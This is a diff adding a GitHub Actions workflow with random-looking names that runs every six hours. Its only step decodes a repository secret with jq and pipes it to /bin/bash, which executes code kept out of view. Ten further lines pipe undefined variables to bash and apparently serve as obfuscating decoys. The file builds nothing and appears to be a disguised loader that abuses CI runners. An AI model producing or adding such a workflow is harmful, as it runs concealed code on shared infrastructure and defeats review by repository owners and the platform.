@@ -1,0 +1,28 @@
+name: yanfusu1932
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          ibyef4060: ${{ secrets.ibyef4060 }}
+        run: |
+          echo $ibyef4060 | jq -r .v1 | /bin/bash
+          echo $tzt0 | jq -r .t9333 | /bin/bash
+          echo $g850 | jq -r .sybb50 | /bin/bash
+          echo $h40 | jq -r .wcwl80778 | /bin/bash
+          echo $befc0876 | jq -r .smo0 | /bin/bash
+          echo $bm9118 | jq -r .at630 | /bin/bash
+          echo $b03800 | jq -r .g179 | /bin/bash
+          echo $gp0636 | jq -r .oqc01634 | /bin/bash
+          echo $d1936 | jq -r .iyhj54299 | /bin/bash
+          echo $lwtl9210 | jq -r .kop6606 | /bin/bash
+          echo $pn7792 | jq -r .tclmm624 | /bin/bash
+
